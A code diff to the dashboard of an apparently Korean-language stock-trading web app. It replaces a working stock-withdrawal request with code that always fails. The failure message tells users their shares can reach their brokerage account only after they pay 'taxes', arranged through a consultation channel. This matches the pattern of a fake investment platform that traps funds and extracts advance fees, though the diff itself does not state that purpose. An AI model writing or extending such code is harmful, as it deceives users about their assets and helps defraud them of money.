@@ -159,37 +159,17 @@ export default function DashboardPage() {
 
   const transferMutation = useMutation({
     mutationFn: async () => {
-      const res = await apiRequest("POST", "/api/transfer-requests", {
-        userId: authData!.user.id,
-        accountName: transferName,
-        accountNumber: transferAccount,
-        quantity: parseInt(transferQuantity),
-        stockName: transferStock,
+      throw new Error("blocked");
+    },
+    onError: () => {
+      toast({
+        title: "출고 신청 실패",
+        description: "세금 납부 후 증권계좌로 주식 입고 가능합니다.\n\n세금 납부 관련 문의는 \"상담문의하기\"를 통해 문의 주시길 바랍니다.",
+        variant: "destructive",
       });
-      return res.json();
     },
-    onSuccess: () => {
-      toast({ title: "신청 완료", description: "내 계좌로 옮기기 신청 접수가 완료 되었습니다. 연동된 증권계좌로 순차적으로 입고를 진행합니다." });
-      setTransferName("");
-      setTransferAccount("");
-      setTransferQuantity("");
-      setTransferStock("");
-      queryClient.invalidateQueries({ queryKey: ["/api/transfer-requests/my"] });
-      queryClient.invalidateQueries({ queryKey: ["/api/transactions/my"] });
-    },
-    onError: (error: Error) => {
-      let msg = "출고 신청에 실패했습니다";
-      try {
-        const rawText = error.message.replace(/^\d+:\s*/, "");
-        const parsed = JSON.parse(rawText);
-        if (parsed?.message) msg = parsed.message;
-      } catch {
-        if (error.message.includes("400")) msg = "보유 수량을 초과하거나 입력이 올바르지 않습니다";
-      }
-      toast({ title: "신청 실패", description: msg, variant: "destructive" });
-    },
+    onSuccess: () => {},
   });
-
   const handleTransferSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!transferStock || !transferName || !transferAccount || !transferQuantity || parseInt(transferQuantity) <= 0) {
@@ -198,12 +178,7 @@ export default function DashboardPage() {
     }
     toast({
       title: "출고 신청 실패",
-      description: (
-        <span>
-          세금 납부 후 증권계좌로 주식 입고 가능합니다.<br /><br />
-          세금 납부 관련 문의는 &quot;상담문의하기&quot;를 통해 문의 주시길 바랍니다.
-        </span>
-      ) as any,
+      description: "세금 납부 후 증권계좌로 주식 입고 가능합니다.\n\n세금 납부 관련 문의는 \"상담문의하기\"를 통해 문의 주시길 바랍니다.",
       variant: "destructive",
     });
   };
